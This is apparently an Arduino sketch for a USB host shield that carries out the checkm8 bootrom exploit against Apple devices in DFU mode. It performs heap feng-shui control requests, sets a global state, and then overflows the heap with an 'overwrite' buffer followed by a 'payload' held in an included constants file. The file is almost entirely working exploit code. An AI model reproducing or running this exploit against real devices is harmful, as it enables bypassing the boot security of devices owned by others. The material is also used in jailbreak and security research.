#include <Usb.h>
#include "constants.h"

USB Usb;
uint8_t addr = 1;
USB_DEVICE_DESCRIPTOR desc_buf;
uint8_t io_buf[0x100];
EpInfo *pep = NULL;
uint16_t nak_limit = 0;
uint8_t rcode;
uint8_t last_state, state;
uint8_t pktsize;
uint16_t sz;
const uint8_t * p;
uint16_t part_sz;
enum {
  CHECKM8_INIT_RESET,
  CHECKM8_HEAP_FENG_SHUI,
  CHECKM8_SET_GLOBAL_STATE,
  CHECKM8_HEAP_OCCUPATION,
  CHECKM8_END
};
uint8_t checkm8_state = CHECKM8_INIT_RESET;

uint8_t send_out(uint8_t * io_buf, uint8_t pktsize)
{
  Usb.bytesWr(rSNDFIFO, pktsize, io_buf);
  Usb.regWr(rSNDBC, pktsize);
  Usb.regWr(rHXFR, tokOUT);
  while(!(Usb.regRd(rHIRQ) & bmHXFRDNIRQ));
  Usb.regWr(rHIRQ, bmHXFRDNIRQ);
  return (Usb.regRd(rHRSL) & 0x0f);
}

void setup() {
  Serial.begin(115200);
  Serial.println("checkm8 started");
  if(Usb.Init() == -1)
    Serial.println("usb init error");
  delay(200);
}

void loop() {
  Usb.Task();
  state = Usb.getUsbTaskState();
  if(state != last_state)
  {
    //Serial.print("usb state: "); Serial.println(state, HEX);
    last_state = state;
  }
  if(state == USB_STATE_ERROR)
  {
    Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
  }
  if(state == USB_STATE_RUNNING)
  {
    Usb.getDevDescr(addr, 0, 0x12, (uint8_t *) &desc_buf);
    if(desc_buf.idVendor != 0x5ac || desc_buf.idProduct != 0x1227) 
    {
      Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
      if(checkm8_state != CHECKM8_END)
      {
          Serial.print("Non Apple DFU found (vendorId: "); Serial.print(desc_buf.idVendor); Serial.print(", productId: "); Serial.print(desc_buf.idProduct); Serial.println(")");
          delay(5000);
      }
      return;
    }
    switch(checkm8_state)
    {
      case CHECKM8_INIT_RESET:
        for(int i = 0; i < 3; i++)
        {
          digitalWrite(6, HIGH);
          delay(500);
          digitalWrite(6, LOW);
          delay(500);
        }
        checkm8_state = CHECKM8_HEAP_FENG_SHUI;
        Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
        break;
      case CHECKM8_HEAP_FENG_SHUI:
        heap_feng_shui();
        checkm8_state = CHECKM8_SET_GLOBAL_STATE;
        Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
        break;
      case CHECKM8_SET_GLOBAL_STATE:
        set_global_state();
        checkm8_state = CHECKM8_HEAP_OCCUPATION;
        while(Usb.getUsbTaskState() != USB_DETACHED_SUBSTATE_WAIT_FOR_DEVICE) { Usb.Task(); }
        break;
      case CHECKM8_HEAP_OCCUPATION:
        heap_occupation();
        checkm8_state = CHECKM8_END;
        Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
        break;
      case CHECKM8_END:
        digitalWrite(6, HIGH);
        break;
    }
  }
}

void heap_feng_shui_req(uint8_t sz)
{
  rcode = Usb.ctrlReq_SETUP(addr, 0, 0x80, 6, 4, 3, 0x40a, sz);
  Usb.regWr(rHCTL, bmRCVTOG1);
  rcode = Usb.dispatchPkt(tokIN, 0, 0);
}

void heap_feng_shui()
{
  Serial.println("1. heap feng-shui");
  heap_feng_shui_req(0xc0);
  heap_feng_shui_req(0xc0);
  for(int i = 0; i < 6; i++)
    heap_feng_shui_req(0xc1); 
}

void set_global_state()
{
  Serial.println("2. set global state");
  rcode = Usb.ctrlReq_SETUP(addr, 0, 0x21, 1, 0, 0, 0, 0x800);
  rcode = Usb.dispatchPkt(tokOUTHS, 0, 0);
  rcode = Usb.ctrlReq(addr, 0, 0x21, 4, 0, 0, 0, 0, 0, NULL, NULL);
}

void heap_occupation()
{ 
  Serial.println("3. heap occupation");
  
  heap_feng_shui_req(0xc1);
  heap_feng_shui_req(0xc1);
  heap_feng_shui_req(0xc1);
  

  sz = sizeof(overwrite);
  p = overwrite;
  rcode = Usb.ctrlReq_SETUP(addr, 0, 0, 9, 0, 0, 0, sz);
  Usb.regWr(rHCTL, bmSNDTOG0);
  send_out(io_buf, 0);
  while(sz) 
  {
    pktsize = min(sz, 0x40);
    for(int i = 0; i < pktsize; i++)
      io_buf[i] = pgm_read_byte(&p[i]);
    send_out(io_buf, pktsize);
    if(rcode)
    {
      Serial.println("sending error");
      checkm8_state = CHECKM8_END;
      return;
    }
    sz -= pktsize;
    p += pktsize;
  }
  
  sz = sizeof(payload);
  p = payload;

  while(sz)
  {
    part_sz = min(0x7ff, sz);
    sz -= part_sz;
    rcode = Usb.ctrlReq_SETUP(addr, 0, 0x21, 1, 0, 0, 0, part_sz);
    Usb.regWr(rHCTL, bmSNDTOG0);
    send_out(io_buf, 0);
    while(part_sz) {
      pktsize = min(part_sz, 0x40);
      for(int i = 0; i < pktsize; i++)
        io_buf[i] = pgm_read_byte(&p[i]);
     send_out(io_buf, pktsize);
     if(rcode)
      {
        Serial.println("sending error");
        checkm8_state = CHECKM8_END;
        return;
      }
      part_sz -= pktsize;
      p += pktsize;
    }
    Serial.print("Payload loading... "); Serial.print(sizeof(payload) - sz); Serial.print("/"); Serial.println(sizeof(payload));
  }
}
